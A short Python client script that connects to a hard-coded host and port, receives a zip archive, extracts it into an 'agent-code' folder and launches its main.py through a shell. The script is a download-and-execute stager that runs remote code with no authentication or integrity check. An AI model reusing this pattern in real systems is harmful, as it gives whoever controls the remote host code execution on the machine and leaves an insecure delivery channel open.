import socket
import tqdm
import os
import zipfile
import subprocess


HOST = '192.168.43.200'
PORT = 5001
SEPARATOR = '<SEPARATOR>'
# receive 4096 bytes each time
BUFFER_SIZE = 4096

# create the client socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    print(f'[+] Connecting to {HOST}:{PORT}')
    client_socket.connect((HOST, PORT))
    print('[+] Connected.')

    # receive the file infos
    # receive using client socket, not server socket
    received = client_socket.recv(1024).decode()
    filename, filesize = received.split(SEPARATOR)
    # remove absolute path if there is
    filename = os.path.basename(filename)

    filesize = int(filesize)

    progress = tqdm.tqdm(range(
        filesize), f'Receiving {filename}', unit='B', unit_scale=True, unit_divisor=1024)
    with open(filename, 'wb') as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:
                # nothing is received
                # file transmitting is done
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))


with zipfile.ZipFile(filename, "r") as zip_ref:
    if not os.path.exists('agent-code'):
        os.mkdir('agent-code')    
    zip_ref.extractall("agent-code")
    os.chdir('agent-code')
    subprocess.Popen('python3 main.py', shell=True)

